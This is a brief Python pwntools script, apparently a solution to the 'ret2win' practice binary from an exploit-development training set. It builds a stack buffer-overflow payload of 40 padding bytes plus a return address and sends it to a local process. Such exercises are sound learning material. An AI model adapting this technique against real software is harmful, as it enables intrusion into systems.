from pwn import *

context(terminal=['tmux','new-window'])
context(os='linux',arch='amd64')
# p = gdb.debug('ret2win')
p = process('ret2win')
ret2win = p64(0x400811)
padding = "A"*40

payload = padding.encode()+ret2win
# sys.stdout.buffer.write(payload)

p.sendline(payload)
print(p.recvall().decode())
